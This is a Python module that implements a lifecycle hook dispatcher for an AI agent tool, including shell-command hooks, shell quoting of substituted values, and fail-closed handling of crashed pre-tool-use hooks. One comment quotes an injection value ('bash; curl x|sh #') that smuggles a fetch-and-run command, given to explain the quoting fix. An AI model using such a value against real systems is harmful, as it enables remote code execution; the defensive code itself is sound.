"""Hook dispatcher — pre/post tool, error, and session lifecycle hooks.

Hooks are user-defined callbacks (Python callables or external shell
commands) that fire at well-known points in Karna's lifecycle.  They
can observe, modify, or block actions.

Adapted from upstream hook architecture (``utils/hooks.ts``,
``types/hooks.ts``) with a simpler, Python-native design.
See NOTICES.md for attribution.
"""

from __future__ import annotations

import asyncio
import logging
import shlex
import sys
from dataclasses import dataclass
from enum import Enum
from typing import Any, Callable, Sequence

if sys.version_info >= (3, 11):
    pass
else:
    pass  # type: ignore[no-redef]

logger = logging.getLogger(__name__)

# Default timeout for shell-command hooks (seconds).
_DEFAULT_HOOK_TIMEOUT = 30


# ----------------------------------------------------------------------- #
#  Public types
# ----------------------------------------------------------------------- #


class HookType(Enum):
    """Well-known lifecycle points where hooks can fire."""

    PRE_TOOL_USE = "pre_tool_use"
    POST_TOOL_USE = "post_tool_use"
    ON_ERROR = "on_error"
    SESSION_START = "session_start"
    SESSION_END = "session_end"
    USER_PROMPT_SUBMIT = "user_prompt_submit"
    BEFORE_SEND = "before_send"


@dataclass
class HookResult:
    """Aggregated result of dispatching one hook type.

    *proceed*: if ``False`` the caller should abort the action.
    *modified_args*: if not ``None``, use these instead of the original args.
    *message*: optional message to display to the user.
    *allow*: alias for ``proceed`` — kept for clarity at call sites that
      phrase the result as "is this action allowed?".
    """

    proceed: bool = True
    modified_args: dict[str, Any] | None = None
    message: str | None = None

    @property
    def allow(self) -> bool:
        """Alias for ``proceed`` — true if the action should be allowed."""
        return self.proceed


# ----------------------------------------------------------------------- #
#  Shell-command hook wrapper
# ----------------------------------------------------------------------- #


def _make_shell_hook(
    command: str,
    *,
    tools: list[str] | None = None,
    timeout: float = _DEFAULT_HOOK_TIMEOUT,
) -> Callable[..., Any]:
    """Create an async callable that runs *command* in a subprocess.

    If *tools* is given, the hook only fires when ``kwargs["tool"]``
    matches one of the listed names.

    The command string may contain ``{key}`` placeholders which are
    substituted from **kwargs** (e.g. ``{error}`` or ``{tool}``).
    """

    async def _shell_hook(**kwargs: Any) -> HookResult:
        # Filter by tool name if configured.
        if tools:
            tool_name = kwargs.get("tool", "")
            if tool_name not in tools:
                return HookResult()

        # Substitute placeholders.
        # CRITICAL-2 fix: shell-quote every substituted value so an
        # attacker-controlled tool name / arg (e.g., "bash; curl x|sh #")
        # cannot break out of the rendered shell string.
        try:
            quoted = {k: shlex.quote(str(v)) for k, v in kwargs.items()}
            rendered = command.format_map(quoted)
        except KeyError:
            rendered = command

        try:
            proc = await asyncio.create_subprocess_shell(
                rendered,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(),
                timeout=timeout,
            )
        except asyncio.TimeoutError:
            logger.warning("Shell hook timed out (%ss): %s", timeout, rendered)
            return HookResult(message=f"Hook timed out: {rendered}")
        except Exception as exc:
            logger.warning("Shell hook failed: %s — %s", rendered, exc)
            return HookResult(message=f"Hook error: {exc}")

        if proc.returncode != 0:
            err_text = (stderr or stdout or b"").decode(errors="replace").strip()
            logger.info(
                "Shell hook exited %d: %s — %s",
                proc.returncode,
                rendered,
                err_text,
            )
            return HookResult(
                proceed=False,
                message=err_text or f"Hook exited with code {proc.returncode}",
            )

        return HookResult()

    return _shell_hook


# ----------------------------------------------------------------------- #
#  Dispatcher
# ----------------------------------------------------------------------- #


class HookDispatcher:
    """Central registry and executor for lifecycle hooks.

    Hooks are async callables ``(**kwargs) -> HookResult | None``.
    When dispatched, all hooks for a given type run in registration order.
    If *any* hook returns ``proceed=False``, the aggregated result also
    has ``proceed=False``.

    Hooks may also be loaded from ``[[hooks]]`` entries in the Karna
    config (TOML) — see ``_load_hooks``.
    """

    def __init__(self, config: Any | None = None) -> None:
        self.hooks: dict[HookType, list[Callable[..., Any]]] = {t: [] for t in HookType}
        if config is not None:
            self._load_hooks(config)

    # ------------------------------------------------------------------ #
    #  Registration
    # ------------------------------------------------------------------ #

    def register(self, hook_type: HookType, fn: Callable[..., Any]) -> None:
        """Append *fn* to the handler list for *hook_type*."""
        if hook_type not in self.hooks:
            raise ValueError(f"Unknown hook type: {hook_type}")
        self.hooks[hook_type].append(fn)

    # ------------------------------------------------------------------ #
    #  Dispatch
    # ------------------------------------------------------------------ #

    async def dispatch(self, hook_type: HookType, **kwargs: Any) -> HookResult:
        """Run all hooks registered for *hook_type* and aggregate results.

        Hooks execute sequentially in registration order.  If any hook
        returns ``proceed=False`` the final result reflects that and
        subsequent hooks still run (so logging/notification hooks fire
        even when a guard blocks).

        If a hook returns ``modified_args``, those args are forwarded to
        subsequent hooks (chaining).
        """
        aggregated = HookResult()

        for fn in self.hooks.get(hook_type, []):
            try:
                result = fn(**kwargs)
                # Support both sync and async hooks.
                if asyncio.iscoroutine(result):
                    result = await result
            except Exception as exc:
                # SECURITY fix: a PRE_TOOL_USE hook that crashes must
                # FAIL CLOSED — otherwise a hook designed to block a
                # dangerous action can be bypassed simply by making it
                # raise.  POST_TOOL_USE / observational hooks fail
                # open (log + continue) because the tool already ran.
                fn_name = getattr(fn, "__name__", repr(fn))
                if hook_type == HookType.PRE_TOOL_USE:
                    logger.error(
                        "PRE_TOOL_USE hook %s crashed — BLOCKING tool call: %s",
                        fn_name,
                        exc,
                        exc_info=True,
                    )
                    aggregated.proceed = False
                    aggregated.message = f"pre-tool-use hook failed: {exc}"
                    # Don't run further hooks — the tool is already
                    # blocked and later hooks shouldn't override the
                    # fail-closed decision.
                    return aggregated
                logger.warning(
                    "Hook %s for %s raised (fail-open): %s",
                    fn_name,
                    hook_type.value,
                    exc,
                    exc_info=True,
                )
                continue

            if result is None:
                continue

            if not isinstance(result, HookResult):
                logger.warning(
                    "Hook %s returned non-HookResult: %r — ignoring",
                    fn,
                    result,
                )
                continue

            # Merge: block wins.
            if not result.proceed:
                aggregated.proceed = False

            # Chain modified args.
            if result.modified_args is not None:
                aggregated.modified_args = result.modified_args
                kwargs["args"] = result.modified_args

            # Last message wins.
            if result.message is not None:
                aggregated.message = result.message

        return aggregated

    # ------------------------------------------------------------------ #
    #  Config loading
    # ------------------------------------------------------------------ #

    def _load_hooks(self, config: Any) -> None:
        """Load hooks from a KarnaConfig-like object.

        Expects ``config`` to expose a ``hooks`` attribute that is a list
        of dicts (matching the ``[[hooks]]`` TOML table array), or to
        have a ``_raw`` dict with a ``hooks`` key.  Falls back silently
        if no hooks section exists.

        Each entry looks like::

            {"type": "pre_tool_use",
             "command": "python ~/.karna/hooks/lint.py",
             "tools": ["edit", "write"]}
        """
        raw_hooks: Sequence[dict[str, Any]] = []

        # Support dict (raw TOML data), Pydantic model with .hooks, or
        # model with _raw dict.
        if isinstance(config, dict):
            raw_hooks = config.get("hooks", [])
        elif hasattr(config, "hooks") and isinstance(config.hooks, list):
            raw_hooks = config.hooks
        elif hasattr(config, "_raw") and isinstance(config._raw, dict):
            raw_hooks = config._raw.get("hooks", [])

        for entry in raw_hooks:
            type_str = entry.get("type", "")
            command = entry.get("command", "")
            tools = entry.get("tools")
            timeout = entry.get("timeout", _DEFAULT_HOOK_TIMEOUT)

            if not type_str or not command:
                logger.warning("Skipping hook entry with missing type/command: %s", entry)
                continue

            try:
                hook_type = HookType(type_str)
            except ValueError:
                logger.warning("Unknown hook type %r — skipping", type_str)
                continue

            fn = _make_shell_hook(command, tools=tools, timeout=timeout)
            self.register(hook_type, fn)
            logger.debug("Loaded shell hook: %s -> %s", hook_type.value, command)
